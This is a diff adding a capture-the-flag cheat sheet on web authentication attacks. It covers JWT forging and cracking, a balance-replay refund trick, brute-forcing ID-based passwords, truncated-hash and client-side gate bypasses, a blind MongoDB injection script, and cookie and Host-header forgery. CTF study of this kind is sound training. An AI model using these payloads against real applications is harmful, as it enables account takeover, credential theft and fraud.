@@ -1,0 +1,108 @@
+# CTF Web - Auth & Access Control Attacks
+
+## JWT Attacks
+
+### Algorithm None
+Remove signature, set `"alg": "none"` in header.
+
+### Algorithm Confusion (RS256 → HS256)
+App accepts both RS256 and HS256, uses public key for both:
+```javascript
+const jwt = require('jsonwebtoken');
+const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
+const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
+```
+
+### Weak Secret Brute-Force
+```bash
+flask-unsign --decode --cookie "eyJ..."
+hashcat -m 16500 jwt.txt wordlist.txt
+```
+
+### JWT Balance Replay (MetaShop Pattern)
+1. Sign up → get JWT with balance=$100 (save this JWT)
+2. Buy items → balance drops to $0
+3. Replace cookie with saved JWT (balance back to $100)
+4. Return all items → server adds prices to JWT's $100 balance
+5. Repeat until balance exceeds target price
+
+**Key insight:** Server trusts the balance in the JWT for return calculations but doesn't cross-check purchase history.
+
+---
+
+## Password/Secret Inference from Public Data
+
+**Pattern (0xClinic):** Registration uses structured identifier (e.g., National ID) as password. Profile endpoints expose enough to reconstruct most of it.
+
+**Exploitation flow:**
+1. Find profile/API endpoints that leak "public" user data (DOB, gender, location)
+2. Understand identifier format (e.g., Egyptian National ID = century + YYMMDD + governorate + 5 digits)
+3. Calculate brute-force space: known digits reduce to ~50,000 or less
+4. Brute-force login with candidate IDs
+
+---
+
+## Weak Signature/Hash Validation Bypass
+
+**Pattern (Illegal Logging Network):** Validation only checks first N characters of hash:
+```javascript
+const expected = sha256(secret + permitId).slice(0, 16);
+if (sig.toLowerCase().startsWith(expected.slice(0, 2))) { // only 2 chars!
+    // Token accepted
+}
+```
+Only need to match 2 hex chars (256 possibilities). Brute-force trivially.
+
+**Detection:** Look for `.slice()`, `.substring()`, `.startsWith()` on hash values.
+
+---
+
+## Client-Side Access Gate Bypass
+
+**Pattern (Endangered Access):** JS gate checks URL parameter or global variable:
+```javascript
+const hasAccess = urlParams.get('access') === 'letmein' || window.overrideAccess === true;
+```
+
+**Bypass:**
+1. URL parameter: `?access=letmein`
+2. Console: `window.overrideAccess = true`
+3. Direct API call — skip UI entirely
+
+---
+
+## NoSQL Injection (MongoDB)
+
+### Blind NoSQL with Binary Search
+```python
+def extract_char(position, session):
+    low, high = 32, 126
+    while low < high:
+        mid = (low + high) // 2
+        payload = f"' && this.password.charCodeAt({position}) > {mid} && 'a'=='a"
+        resp = session.post('/login', data={'username': payload, 'password': 'x'})
+        if "Something went wrong" in resp.text:
+            low = mid + 1
+        else:
+            high = mid
+    return chr(low)
+```
+
+**Why simple boolean injection fails:** App queries with injected `$where`, then checks if returned user's credentials match input exactly. `'||1==1||'` finds admin but fails the credential check.
+
+---
+
+## Cookie Manipulation
+```bash
+curl -H "Cookie: role=admin"
+curl -H "Cookie: isAdmin=true"
+```
+
+## Host Header Bypass
+```http
+GET /flag HTTP/1.1
+Host: 127.0.0.1
+```
+
+## Hidden API Endpoints
+Search JS bundles for `/api/internal/`, `/api/admin/`, undocumented endpoints.
